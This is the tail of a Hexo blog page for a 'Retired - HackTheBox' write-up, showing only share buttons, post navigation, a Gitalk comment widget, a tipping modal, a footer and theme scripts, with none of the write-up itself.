    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&title=《Retired - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&title=《Retired - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/06/23/Retired-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Retired - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/06/29/Trick-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Trick - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/06/14/StreamIO-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">StreamIO - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&title=《Retired - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&title=《Retired - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/06/23/Retired-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Retired - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/06/23/Retired-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJklEQVR42u3aSW7DMAwF0N7/0inQVYE2ziepDpaeV4GT2HpaEOLw9hZfj4/r+vPnO/n9r98++82CCwMD47aMx+WV/Kb633xrkudjYGCcw+gF2eqik3B8HdCf3sfAwMAIwmUv1FaPnhgYGBgJY76gPNHFwMDAqCax86Vfv/GXcnEMDIwbMlY1Bn7i8x/0NzAwMP4ZY1Luv35afn/BejAwMLZm5Mnq2kNhvuhCcouBgXEMIz8U5sNevWcmLVIMDIwzGdcv7pGq5f68hYCBgXEmIzkgTsYjeiNlUYjHwMDYlFFtB64d8OoV8l70YDEwMLZjVJuXeUmuWkrrFfUwMDBOYOTF916xPjneTcbFMDAwzmHkS5+ko/My3NMtwMDA2JrRK7GtSnon42IvjokYGBjbMaphsdokqG5K9cCKgYFxAqNXn8uXW33LJD3GwMDYlZEX8fNUtjquMTk4YmBgnMCYjEqsaohWk9gXIR4DA2MjRrWVmBTo84Ndr2Hwzb8wMDC2ZvSK/qvm0ZItKId7DAyM7Rh54OslnJPwvaz7ioGBcXNGEkyrUxv5IlalwRgYGHszHsUrT1PzJmh1CCzKxTEwMDZi9MJcPjrW24h5UMbAwNiPMQmyeT2v+oTFMyMYGBhbMJIg2xuMaM59VFsXGBgYGPEiqsvND4UvwBgYGBjxOMX88IeBgYGxKont9RB7bdFoCzAwMLZmzCc1JqE5X9DiFiYGBsY9GO9fnq1jwRuU1QAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
